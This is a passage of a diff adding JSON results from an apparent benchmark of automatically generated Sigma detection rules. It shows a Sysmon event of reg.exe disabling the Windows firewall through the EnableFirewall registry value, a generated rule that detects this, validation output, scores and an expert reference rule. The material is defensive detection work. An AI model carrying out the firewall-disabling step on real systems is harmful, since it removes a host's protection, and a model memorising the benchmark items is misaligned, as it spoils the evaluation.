+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2025-10-26 18:36:31.258",
+        "ProcessGuid": "{5aa13a44-6a2f-68fe-0857-000000004002}",
+        "ProcessId": "9720",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\\EnableFirewall",
+        "Details": "DWORD (0x00000000)",
+        "User": "ATTACKRANGE\\Administrator"
+       }
+      ],
+      "seconds": 9.72
+     },
+     "tokens": 2220,
+     "latency_s": 11.02,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 3,
+     "action": "repair",
+     "rule_text": "title: Disable Microsoft Defender Firewall via Registry\nid: ffe89f82-3959-4d4b-a84a-f2668418b969\nstatus: experimental\ndescription: Detects attempts to disable Windows Defender Firewall by modifying the EnableFirewall registry value via reg.exe.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.defense-impairment\n- attack.t1562.004\n- attack.t1686.003\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection_proc:\n    Image|endswith: \\\\reg.exe\n    CommandLine|contains:\n    - EnableFirewall\n    - /d 0\n  selection_reg:\n    Image|endswith: \\\\reg.exe\n    TargetObject|contains: EnableFirewall\n    Details|contains: '0x00000000'\n  condition: selection_proc or selection_reg\nfalsepositives:\n- Legitimate administrative changes to firewall policy via registry are rare but possible.\nlevel: high\n",
+     "sha256": "42a90e03025beed3f2ebf811dc553908445e7bfb7274dc1b8e83535c8a544207",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "=== Issues ===\nissue=InvalidATTACKTagIssue severity=medium description=Invalid MITRE ATT&CK tagging rule=<tmp>\\proc_creation_win_shakedown_candidate.yml tag=attack.t1562.004\n\n=== Summary ===\nFound 0 errors, 0 condition errors and 1 issues.\nNo rule errors found.\nNo condition errors found.\n\nValidation issue summary:\n+-------+-----------------------+----------+------------------------------+\n| Count | Issue                 | Severity | Description                  |\n+-------+-----------------------+----------+------------------------------+\n| 1     | InvalidATTACKTagIssue | MEDIUM   | Invalid MITRE ATT&CK tagging |\n+-------+-----------------------+----------+------------------------------+\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 1,
+      "attack_missed": [],
+      "attack_events_hit": 1,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [],
+      "seconds": 8.7
+     },
+     "tokens": 2949,
+     "latency_s": 17.98,
+     "evaluator_error": null,
+     "resamples": 0
+    }
+   ],
+   "oneshot_heldout": null,
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 9.72
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Disable Microsoft Defender Firewall via Registry\nid: 974515da-6cc5-4c95-ae65-f97f9150ec7f\nstatus: test\ndescription: Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md#atomic-test-2---disable-microsoft-defender-firewall-via-registry\nauthor: frack113\ndate: 2022-01-09\nmodified: 2024-03-25\ntags:\n    - attack.defense-impairment\n    - attack.t1686.003\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        # HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\EnableFirewall\n        # HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\\EnableFirewall\n        # HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\EnableFirewall\n        TargetObject|contains: '\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\'\n        TargetObject|endswith: '\\EnableFirewall'\n        Details: 'DWORD (0x00000000)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\nregression_tests_path: regression_data/rules/windows/registry/registry_set/registry_set_disable_defender_firewall/info.yml\nsimulation:\n    - type: atomic-red-team\n      name: Disable Microsoft Defender Firewall via Registry\n      technique: T1562.004\n      atomic_guid: afedc8c4-038c-4d82-b3e5-623a95f8a612\n"
+  }
+ ]
+}
